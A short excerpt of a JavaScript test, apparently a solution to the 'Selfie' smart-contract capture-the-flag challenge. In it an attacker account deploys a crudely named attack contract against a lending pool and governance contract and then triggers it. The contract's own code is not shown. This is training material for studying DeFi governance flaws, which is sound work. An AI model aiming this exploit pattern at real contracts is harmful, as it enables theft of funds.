...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const FuckTheGovernmentFactory = await ethers.getContractFactory("FuckTheGovernment", attacker);
        this.attack = await FuckTheGovernmentFactory.deploy(this.pool.address, this.governance.address);
        let actionId = await this.attack.callStatic.attack(TOKENS_IN_POOL, this.pool.address);
        await this.attack.attack(TOKENS_IN_POOL, this.pool.address);
